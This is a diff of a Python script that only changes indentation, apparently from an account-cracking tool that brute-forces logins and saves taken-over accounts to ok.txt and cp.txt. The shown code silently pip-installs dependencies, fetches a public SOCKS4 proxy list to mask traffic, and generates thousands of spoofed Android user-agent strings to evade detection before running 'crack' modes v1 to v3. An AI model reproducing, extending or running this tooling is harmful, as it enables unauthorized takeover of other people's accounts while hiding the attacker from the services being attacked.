@@ -12,7 +12,7 @@ try:
      from concurrent.futures import ThreadPoolExecutor as ThreadPool 
      import mechanize 
      from requests.exceptions import ConnectionError 
- except ModuleNotFoundError: 
+except ModuleNotFoundError: 
      os.system('pip install mechanize requests futures bs4==2 > /dev/null') 
      os.system('pip install bs4') 
  RED = '\033[1;91m' 
@@ -53,13 +53,13 @@ try:
  cokbrut=[] 
  ses=requests.Session() 
  princp=[] 
- try: 
+try: 
   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text 
   open('.prox.txt','w').write(prox) 
- except Exception as e: 
+except Exception as e: 
   print('') 
  prox=open('.prox.txt','r').read().splitlines() 
- for xd in range(10000): 
+for xd in range(10000): 
      aa='Mozilla/5.0 (Linux; U; Android' 
      b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17']) 
      c=' en-us; GT-' 
@@ -89,7 +89,7 @@ try:
 ────────────────────────────────────────────────────────────────────────────────                                                                                                                                                                           
  """) 
   
- class Main: 
+class Main: 
      def __init__(self): 
          self.id = [] 
          self.ok = [] 
@@ -114,7 +114,7 @@ try:
              exit() 
          else: 
              exit() 
- def v1(): 
+def v1(): 
      user=[] 
      os.system('clear') 
      print(logo) 
@@ -143,7 +143,7 @@ try:
      print(' [♥] Crack process has been completed') 
      print(' [♥] Ids saved in ok.txt,cp.txt') 
      print(50*'_') 
- def v2(): 
+def v2(): 
      user=[] 
      os.system('clear') 
      print(logo) 
@@ -171,7 +171,7 @@ try:
      print(' [♥] Crack process has been completed') 
      print(' [♥] Ids saved in ok.txt,cp.txt') 
      print(50*'_') 
- def v3(): 
+def v3(): 
      user=[] 
      os.system('clear') 
      print(logo) 
